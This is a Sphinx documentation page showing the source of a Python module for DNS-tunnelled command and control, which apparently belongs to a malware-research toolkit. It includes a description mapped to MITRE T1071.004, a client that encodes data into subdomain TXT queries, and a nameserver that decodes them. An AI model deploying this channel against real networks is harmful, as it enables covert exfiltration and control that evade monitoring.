@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>mwutils.command_and_control.dns &mdash; mwutils 1.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js"></script>
+        <script src="../../../_static/jquery.js"></script>
+        <script src="../../../_static/underscore.js"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="../../../_static/doctools.js"></script>
+        <script src="../../../_static/sphinx_highlight.js"></script>
+        <script src="https://unpkg.com/mermaid@9.4.0/dist/mermaid.min.js"></script>
+        <script>mermaid.initialize({startOnLoad:true});</script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            mwutils
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../README.html">About the Package</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Documentation.html">Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Logging.html">Logging</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../modules.html">mwutils</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">mwutils</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../../index.html">Module code</a></li>
+      <li class="breadcrumb-item active">mwutils.command_and_control.dns</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <h1>Source code for mwutils.command_and_control.dns</h1><div class="highlight"><pre>
+<span></span><span class="sd">&quot;&quot;&quot;Application Layer Protocol: DNS</span>
+
+<span class="sd">Adversaries may communicate using the Domain Name System (DNS) application layer protocol </span>
+<span class="sd">to avoid detection/network filtering by blending in with existing traffic. </span>
+<span class="sd">Commands to the remote system, and often the results of those commands, </span>
+<span class="sd">will be embedded within the protocol traffic between the client and server.</span>
+
+<span class="sd">The DNS protocol serves an administrative function in computer networking </span>
+<span class="sd">and thus may be very common in environments. </span>
+<span class="sd">DNS traffic may also be allowed even before network authentication is completed. </span>
+<span class="sd">DNS packets contain many fields and headers in which data can be concealed. </span>
+<span class="sd">Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems </span>
+<span class="sd">under their control within a victim network while also mimicking normal, expected traffic.</span>
+
+<span class="sd">Mitre: `T1071.004 &lt;https://attack.mitre.org/versions/v12/techniques/T1071/004/&gt;`_</span>
+
+
+<span class="sd">.. mermaid::</span>
+
+<span class="sd">   sequenceDiagram</span>
+<span class="sd">      participant C as Client</span>
+<span class="sd">      participant S as DNS Nameserver</span>
+<span class="sd">      Note left of C: Client information &lt;br/&gt; IP: 192.168.178.2 = MTkyLjE2OC4xNzguMg</span>
+<span class="sd">      C-&gt;&gt;S: DNS Request: &lt;br/&gt;Type: TXT &lt;br/&gt;MTkyLjE2OC4xNzguMg.example.com</span>
+<span class="sd">      S--&gt;&gt;C:DNS Response: &lt;br/&gt;Type: TXT &lt;br/&gt; Code: NOERROR &lt;data&gt;</span>
+
+
+<span class="sd">Useful packages for dns are:</span>
+
+<span class="sd">#. `dnspython &lt;https://github.com/rthalley/dnspython&gt;`_</span>
+
+<span class="sd">#. `nserver &lt;https://github.com/nhairs/nserver&gt;`_</span>
+
+<span class="sd">#. `dnslib &lt;https://github.com/paulc/dnslib&gt;`_</span>
+
+
+<span class="sd">.. note::</span>
+<span class="sd">    A subdomain can have up to 63 characters. </span>
+<span class="sd">    This means that the data you can send can not be longer than 63 characters per subdomain.</span>
+<span class="sd">    Note that this does&#39;t mean that you can&#39;t use multiple subdomains.</span>
+<span class="sd">    But be aware that a domain has a maximum of 253 characters.</span>
+
+<span class="sd"># https://stackoverflow.com/questions/10552665/names-and-maximum-lengths-of-the-parts-of-a-url</span>
+
+<span class="sd">.. note::</span>
+<span class="sd">    A TXT Records can have up to 255 characters. </span>
+<span class="sd">    There can be more than 255 characters by adding multiple strings together.</span>
+<span class="sd">    </span>
+<span class="sd"># https://support.google.com/a/answer/11613097?hl=en#:~:text=Most%20TXT%20records%20can%20have,with%20a%20255%2Dcharacter%20limit.</span>
+
+<span class="sd">      </span>
+<span class="sd">.. note::</span>
+<span class="sd">    When sending data embedded in the URL it must be encoded in a URL safe manner. </span>
+<span class="sd">    Base64 can be used. </span>
+<span class="sd">    But be aware of the = and == padding characters.</span>
+
+<span class="sd">    .. math:: \\lceil \\frac{n}{3} \\rceil</span>
+
+
+<span class="sd">The following code implements a simple DNS Nameserver that can be used to receive the sent requests.</span>
+
+<span class="sd">.. code:: python</span>
+
+<span class="sd">    if __name__ == &quot;__main__&quot;:</span>
+<span class="sd">        # Client</span>
+<span class="sd">        # dns_send(&quot;data.example.com&quot;)</span>
+
+<span class="sd">        # Server</span>
+<span class="sd">        def dummy(data):</span>
+<span class="sd">            return f&quot;response of: {data}&quot;</span>
+
+<span class="sd">        dns_factory(dummy).run()</span>
+
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">dns.resolver</span> <span class="k">as</span> <span class="nn">dnsr</span>
+<span class="c1"># import dnslib</span>
+<span class="kn">from</span> <span class="nn">nserver</span> <span class="kn">import</span> <span class="n">TXT</span><span class="p">,</span> <span class="n">NameServer</span>
+
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<div class="viewcode-block" id="dns_send"><a class="viewcode-back" href="../../../mwutils.command_and_control.dns.html#mwutils.command_and_control.dns.dns_send">[docs]</a><span class="k">def</span> <span class="nf">dns_send</span><span class="p">(</span>  <span class="c1"># pylint: disable=W0102</span>
+    <span class="o">*</span><span class="n">args</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">address</span><span class="p">:</span> <span class="nb">list</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">],</span> <span class="n">port</span><span class="o">=</span><span class="mi">53</span>
+<span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Takes (sub-)domain and assembles a FQDN.</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        *args (str): The (sub-)domains that are used to build the FQDN.</span>
+<span class="sd">        address (list, optional): List of DNS-Nameserver IP&#39;s . Defaults to [&quot;127.0.0.1&quot;].</span>
+<span class="sd">        port (int, optional): Port of DNS-Nameserver to send requests to. Defaults to 53.</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        str: Answer of the DNS-Nameserver.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">dns_resolver</span> <span class="o">=</span> <span class="n">dnsr</span><span class="o">.</span><span class="n">Resolver</span><span class="p">(</span><span class="n">configure</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">dns_resolver</span><span class="o">.</span><span class="n">nameservers</span> <span class="o">=</span> <span class="n">address</span>
+    <span class="n">dns_resolver</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">dns_resolver</span><span class="o">.</span><span class="n">resolve</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="o">*</span><span class="n">args</span><span class="p">])</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;TXT&quot;</span><span class="p">,</span> <span class="n">tcp</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">answers</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">string</span> <span class="ow">in</span> <span class="n">answers</span><span class="o">.</span><span class="n">strings</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">+=</span> <span class="n">string</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;ascii&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">result</span></div>
+
+
+<div class="viewcode-block" id="dns_factory"><a class="viewcode-back" href="../../../mwutils.command_and_control.dns.html#mwutils.command_and_control.dns.dns_factory">[docs]</a><span class="k">def</span> <span class="nf">dns_factory</span><span class="p">(</span>
+    <span class="n">func</span><span class="p">:</span> <span class="n">callable</span><span class="p">,</span> <span class="n">domain</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;example.com&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">53</span>
+<span class="p">)</span> <span class="o">-&gt;</span> <span class="n">NameServer</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Return a DNS Nameserver according to the passed parameters.</span>
+
+<span class="sd">    Supply a function that has one parameter.</span>
+<span class="sd">    The passed argument is list of strings which represent the subdomains in a request.</span>
+<span class="sd">    For example [&quot;subsub&quot;, &quot;sub&quot;].</span>
+
+<span class="sd">    example function:</span>
+<span class="sd">        def dummy(data):</span>
+<span class="sd">            return f&#39;response of: {data}&#39;</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        func (callable): A function containing the logic for a dns request.</span>
+<span class="sd">            Its parameter takes a list of strings.</span>
+<span class="sd">            Returns a string which is sent back to the client.</span>
+
+<span class="sd">        domain (str, optional): The base domain which clients want to resolve.</span>
+<span class="sd">            Defaults to &quot;example.com&quot;.</span>
+
+<span class="sd">        port (int, optional): The port to which a request is sent. Defaults to 53.</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        NameServer: The NameServer.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">name_server</span> <span class="o">=</span> <span class="n">NameServer</span><span class="p">(</span><span class="s2">&quot;DNS-NameServer&quot;</span><span class="p">)</span>
+
+    <span class="nd">@name_server</span><span class="o">.</span><span class="n">rule</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&quot;TXT&quot;</span><span class="p">])</span>  <span class="c1"># only domain</span>
+    <span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+        <span class="c1"># data = query.name.removesuffix(f&quot;{domain}&quot;).split(&quot;.&quot;)    # would always return [&quot;&quot;]</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">func</span><span class="p">([</span><span class="s2">&quot;&quot;</span><span class="p">])</span>
+        <span class="k">return</span> <span class="n">TXT</span><span class="p">(</span><span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span>
+
+    <span class="nd">@name_server</span><span class="o">.</span><span class="n">rule</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;**.</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&quot;TXT&quot;</span><span class="p">])</span>  <span class="c1"># n subdomain</span>
+    <span class="k">def</span> <span class="nf">sub</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">removesuffix</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;.</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">TXT</span><span class="p">(</span><span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span>
+
+    <span class="n">name_server</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">SERVER_ADDRESS</span> <span class="o">=</span> <span class="s2">&quot;0.0.0.0&quot;</span>
+    <span class="n">name_server</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">SERVER_PORT</span> <span class="o">=</span> <span class="n">port</span>
+    <span class="c1"># ns.settings.SERVER_TYPE = &quot;TCPv4&quot;</span>
+    <span class="k">return</span> <span class="n">name_server</span></div>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="c1"># client</span>
+    <span class="c1"># dns_send(&quot;data.example.com&quot;)</span>
+
+    <span class="c1"># server</span>
+    <span class="k">def</span> <span class="nf">dummy</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;response of: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span>
+
+    <span class="n">dns_factory</span><span class="p">(</span><span class="n">dummy</span><span class="p">)</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</pre></div>
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, wenzelfe.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
